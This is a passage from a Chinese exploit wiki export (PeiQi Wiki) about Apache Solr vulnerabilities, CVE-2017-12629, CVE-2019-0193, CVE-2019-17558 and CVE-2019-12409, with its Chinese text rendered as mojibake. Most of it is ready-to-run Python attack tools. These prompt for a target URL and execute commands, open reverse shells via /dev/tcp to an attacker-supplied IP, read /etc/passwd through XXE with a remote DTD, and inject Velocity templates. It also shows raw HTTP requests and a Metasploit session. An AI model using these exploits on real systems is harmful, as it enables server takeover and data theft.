\"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\"%s\"]}} \"\"\" % (n, dnslog_url) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] æˆåŠŸæ‰§è¡Œï¼Œè¯·æŸ¥çœ‹dnslog \\033[0m\") else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") def POC_3(target_url, core_name, n, ip, port): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/%s/%s 0>&1\"]}} \"\"\" % (n, ip, port) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] æˆåŠŸæ‰§è¡Œ \\033[0m\") else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_3(target_url, core_name, n, IP, PORT) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35mè¯·è¾“å…¥ä½ çš„dnslogåœ°å€ï¼š\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) [!NOTE] å¦‚æœshellæˆ–dnslogæ— ååº”ï¼Œå¯ä»¥é€‰æ‹©æ›´æ”¹ä¸€ä¸‹POCçš„éƒ¨åˆ†å‚æ•°æ‰§è¡Œéœ€è¦çš„ä»£ç  å‚è€ƒæ–‡ç«  Apache Solrè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-12629ï¼‰ä»åˆ©ç”¨åˆ°å…¥ä¾µæ£€æµ‹ cve-2017-12629 apache solr xxe & rce æ¼æ´åˆ†æ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr XXE æ¼æ´ CVE-2017-12629.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr XXE æ¼æ´ CVE-2017-12629.html","title":"Apache Solr XXE æ¼æ´ CVE-2017-12629","keywords":"","body":"Apache Solr XXE æ¼æ´ CVE-2017-12629 æ¼æ´æè¿° Apache Solr æ˜¯ä¸€ä¸ªå¼€æºçš„æœç´¢æœåŠ¡å™¨ã€‚Solr ä½¿ç”¨ Java è¯­è¨€å¼€å‘ï¼Œä¸»è¦åŸºäº HTTP å’Œ Apache Lucene å®ç°ã€‚åŸç†å¤§è‡´æ˜¯æ–‡æ¡£é€šè¿‡Httpåˆ©ç”¨XMLåŠ åˆ°ä¸€ä¸ªæœç´¢é›†åˆä¸­ã€‚æŸ¥è¯¢è¯¥é›†åˆä¹Ÿæ˜¯é€šè¿‡ httpæ”¶åˆ°ä¸€ä¸ªXML/JSONå“åº”æ¥å®ç°ã€‚æ­¤æ¬¡7.1.0ä¹‹å‰ç‰ˆæœ¬æ€»å…±çˆ†å‡ºä¸¤ä¸ªæ¼æ´ï¼šXMLå®ä½“æ‰©å±•æ¼æ´ï¼ˆXXEï¼‰å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆRCEï¼‰ã€‚ å½±å“ç‰ˆæœ¬ Apache Solr ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d æ¼æ´å¤ç° Dnslog å…ˆè¯·æ±‚urlåœ°å€è·å– core å†…å®¹ http://xxx.xxx.xxx.xxx:8983/solr/admin/cores è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v=''}&wt=xml æŸ¥çœ‹dnslogå¾—åˆ°è¯·æ±‚ è¿œç¨‹è¯»å–æ–‡ä»¶ åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå†™å…¥ä¸€ä¸ªå¯è®¿é—®çš„XMLæ–‡ä»¶ï¼Œå†…å®¹å†™å…¥ \"> ç„¶åè¯·æ±‚è¿™ä¸ªæ–‡ä»¶æ¥è¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ http://xxx.xxx.xxx.xxx:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser [!NOTE] æ³¨æ„è¿™é‡Œçš„payloadè¿›è¡Œäº†urlç¼–ç ,è¯·æ±‚çš„æ–‡ä»¶ä¸º http://peiqi.tech/1.dtdï¼Œæœ‰æ›´å¤šéœ€æ±‚è‡ªè¡Œæ›´æ”¹å†™å…¥çš„xmlæ–‡ä»¶ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslogåœ°å€(æ¼æ´å¤–è¿æ£€æµ‹) \\033[0m') print('+ \\033[36mCmd >>> xxe_file(è¯»å–/etc/passwd) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url): dns_payload = \"\"\" /solr/%s/select?q={!xmlparser v=''}&wt=xml \"\"\" % (core_name, dnslog_url) vuln_url = target_url + dnslog_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"HTTP ERROR 500\" in response.text: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") else: print(\"\\033[32m[o] è¯·æŸ¥çœ‹dnslogå“åº” \\033[0m\") except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") def POC_3(target_url, core_name): file_payload = \"\"\"/solr/{}/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser\"\"\".format(core_name) vuln_url = target_url + file_payload headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"/usr/sbin\" in response.text: print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\",response.text) else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35mè¯·è¾“å…¥ä½ çš„dnslogåœ°å€ï¼š\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) elif cmd == \"xxe_file\": POC_3(target_url, core_name) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193.html","title":"Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193","keywords":"","body":"Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193 æ¼æ´æè¿° 2019 å¹´ 08 æœˆ 01 æ—¥ï¼ŒApache Solr å®˜æ–¹å‘å¸ƒé¢„è­¦ï¼ŒApache Solr DataImport åŠŸèƒ½ åœ¨å¼€å¯ Debug æ¨¡å¼æ—¶ï¼Œå¯ä»¥æ¥æ”¶æ¥è‡ªè¯·æ±‚çš„â€dataConfigâ€å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°çš„åŠŸèƒ½ä¸data-config.xml ä¸€æ ·ï¼Œä¸è¿‡æ˜¯åœ¨å¼€å¯ Debug æ¨¡å¼æ—¶æ–¹ä¾¿é€šè¿‡æ­¤å‚æ•°è¿›è¡Œè°ƒè¯•ï¼Œå¹¶ä¸” Debug æ¨¡å¼çš„å¼€å¯æ˜¯é€šè¿‡å‚æ•°ä¼ å…¥çš„ã€‚åœ¨ dataConfig å‚æ•°ä¸­å¯ä»¥åŒ…å« script æ¶æ„è„šæœ¬å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # åˆ›å»ºä¸€ä¸ªsolræ ¸å¿ƒtest docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° ç‚¹å‡»åˆšåˆšåˆ›å»ºçš„testè¿›å…¥è°ƒè¯• å°†ä¸‹é¢çš„POCä»£ç å¡«å…¥ Debug-Mode ä¸­ æ³¨æ„ POC æ‰§è¡Œçš„ä»£ç ä¸­çš„base64å­—ç¬¦ä¸²çš„ä½ç½®è¯·ç½®æ¢æˆè‡ªå·±çš„ipåœ°å€å¹¶base64åŠ å¯†å¡«å…¥ [!NOTE] bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 ç›´æ¥å¦‚ä¸Šå†™å…¥åå¼¹æ— ååº”ï¼Œä¸ç¨³å®šï¼Œéœ€è¦base64åŠ å¯†å†™æ‰èƒ½åå¼¹ä¸€ä¸ªshell ç‚¹å‡»EXecuteæ‰§è¡Œä»£ç  æˆåŠŸåå¼¹shell æ¼æ´åˆ©ç”¨POC [!NOTE] POCä¸æ”¯æŒåå¼¹shellï¼Œå¦‚éœ€åå¼¹shellï¼Œè¯·æŒ‰å¦‚ä¸Šæ­¥éª¤åå¼¹shell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(å‘½ä»¤æ‰§è¡Œ) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY&wt=json\" response = requests.request(\"GET\", url=mode_url, timeout=20) mode = dict(dict(list(json.loads(response.text)[\"solr-mbeans\"])[1])['/dataimport'])['class'] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode: print(\"\\033[32m[o] ç›®æ ‡Url,Dataimportæ¨¡å—å¼€å¯\\033[0m\") else: print(\"\\033[31m[x] ç›®æ ‡Url,Dataimportæ¨¡å—æœªå¼€å¯\\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host': target_url, 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", 'Accept': \"application/json, text/plain, */*\", 'Accept-Language': \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", 'Accept-Encoding': \"zip, deflate\", 'Referer': \"\" + target_url + \"/solr/\", 'Content-type': \"application/x-www-form-urlencoded\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"1007\", 'Connection': \"close\" } payload = \"\"\" command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test&name=dataimport&dataConfig= \"\"\" % cmd response = requests.request(\"POST\", url=vuln_url, data=payload, headers=headers, timeout=30) try: get_message = list(json.loads(response.text)[\"documents\"])[0] message = dict(get_message)['title'][0] print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\", message) except: print(\"\\033[31m[x] ä»£ç æ‰§è¡Œå¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) else: POC_3(target_url, core_name, cmd) å‚è€ƒæ–‡ç«  apache solrè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(cve-2019-0193) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558.html","title":"Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558","keywords":"","body":"Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 æ¼æ´æè¿° 2019å¹´10æœˆæœ«ï¼ŒGitHubä»£ç ä¸­å®‰å…¨ç ”ç©¶å‘˜S00pYå‘å¸ƒä¸€ä¸ªApache Solr Velocityæ¨¡ç‰ˆæ³¨å…¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„POCï¼Œå‘ç°ç½‘ç»œä¸Šå‡ºç°é’ˆå¯¹Apache SolræœåŠ¡å™¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºVelocityæ¨¡æ¿å­˜åœ¨æ³¨å…¥æ‰€è‡´ï¼ˆVelocityæ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ¨¡æ¿å¼•æ“ï¼Œå¯è®©ä½¿ç”¨è€…é€šè¿‡æ¨¡æ¿è¯­è¨€å¼•ç”¨Javaä¸­å®šä¹‰çš„å¯¹è±¡ï¼‰ã€‚æ”»å‡»è€…åœ¨çŸ¥é“SolræœåŠ¡å™¨ä¸ŠCoreåç§°åï¼Œå…ˆæŠŠparams.resource.loader.enabledè®¾ç½®ä¸ºtrueï¼ˆå°±å¯åŠ è½½æŒ‡å®šèµ„æºï¼‰ï¼Œå†è¿›è¡Œè¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr 5.x è‡³ 8.2.0 ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # åˆ›å»ºä¸€ä¸ªsolræ ¸å¿ƒtest docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° æ‰“å¼€åè·å– Core ä¿¡æ¯ å¾—çŸ¥ test è¿™ä¸ª Core å­˜åœ¨ è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/test/config æ­£å¸¸ è®¿é—®Coreçš„configé…ç½®ä¿¡æ¯æ—¶ï¼Œé€šè¿‡POSTè¯·æ±‚æŠŠparams.resource.loader.enabledè®¾ç½®ä¸º Trueï¼Œå†é€šè¿‡ç²¾å¿ƒæ„é€ çš„getè¯·æ±‚å³å¯RCEï¼Œæ­¤æ—¶ç”¨æˆ·å°±å¯ä»¥åŠ è½½æŒ‡å®šèµ„æºï¼Œæ„é€ ä¸€ä¸ªèƒ½æ‰§è¡Œå‘½ä»¤çš„æ¶æ„è¯·æ±‚ è®¾ç½®params.resource.loader.enabledä¸ºTrue POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } å‘½ä»¤æ‰§è¡Œ å†ä½¿ç”¨POCé€ æˆå‘½ä»¤æ‰§è¡Œ http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end åå¼¹hellï¼Œå› ä¸ºéƒ¨åˆ†å‘½ä»¤ä¼šè¢«è¿‡æ»¤å¯¼è‡´è¿”å› Error 500 ï¼Œæ‰€ä»¥åå¼¹shelléœ€è¦ç”¨å¦å¤–çš„åå¼¹shellæ–¹æ³• POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 POCéœ€è¦Urlencodingè¿›è¡Œç¼–ç æ‰èƒ½ç»•è¿‡ POC ï¼š %2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261 æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 cve-2019-17558.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(å‘½ä»¤æ‰§è¡Œ) \\033[0m') print('+ \\033[36mCmd >>> shell(åå¼¹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POSTè¯·æ±‚æˆåŠŸå°†params.resource.loader.enabledè®¾ç½®ä¸ºTrue \\033[0m\") else: print(\"\\033[31m[x] POSTè¯·æ±‚params.resource.loader.enabledè®¾ç½®ä¸ºTrueå¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] ä»£ç æ‰§è¡Œå¤±è´¥ï¼Œå“åº”ä¸º Error 500 \\033[0m\") else: print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\",response.text) def POC_4(target_url, core_name, IP, POST): # POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, POST) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_4(target_url, core_name, IP, PORT) else: POC_3(target_url, core_name, cmd) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Solr/Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409.html","title":"Apache Solr JMXæœåŠ¡ RCE  CVE-2019-12409","keywords":"","body":"Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409 æ¼æ´æè¿° Java ManagementExtensionsï¼ˆJMXï¼‰æ˜¯ä¸€ç§JavaæŠ€æœ¯ï¼Œä¸ºç®¡ç†å’Œç›‘è§†åº”ç”¨ç¨‹åºã€ç³»ç»Ÿå¯¹è±¡ã€è®¾å¤‡ï¼ˆå¦‚æ‰“å°æœºï¼‰å’Œé¢å‘æœåŠ¡çš„ç½‘ç»œæä¾›ç›¸åº”çš„å·¥å…·ã€‚JMX ä½œä¸º Javaçš„ä¸€ç§Beanç®¡ç†æœºåˆ¶ï¼Œå¦‚æœJMXæœåŠ¡ç«¯å£æš´éœ²ï¼Œé‚£ä¹ˆè¿œç¨‹æ”»å‡»è€…å¯ä»¥è®©è¯¥æœåŠ¡å™¨è¿œç¨‹åŠ è½½æ¶æ„çš„Beanæ–‡ä»¶ï¼Œéšç€Beançš„æ»¥ç”¨å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr 8.1.1 Apache Solr 8.2.0 ç¯å¢ƒæ­å»º ä¸‹è½½ Apache Solr 8.2.0 ä¹Ÿå¯ä»¥dockeræ­å»º docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° æŸ¥çœ‹æ­å»ºçš„Solræ˜¯å¦å­˜åœ¨æ¼æ´,æŸ¥çœ‹solr.in.shé…ç½®æ–‡ä»¶ä¸­çš„ENABLE_REMOTE_JMX_OPTSé€‰é¡¹è®¾ç½®æ˜¯å¦ä¸ºâ€œTureâ€ï¼Œå¦‚æœä¸ºTureï¼Œåˆ™å­˜åœ¨æ¼æ´ æŸ¥çœ‹æ¼æ´ç«¯å£18983æ˜¯å¦å¼€æ”¾ [!NOTE] nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/æ¡Œé¢# msfconsole , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| =[ metasploit v5.0.101-dev ] + -- --=[ 2049 exploits - 1108 auxiliary - 344 post ] + -- --=[ 562 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 > use exploit/multi/misc/java_jmx_server [*] No 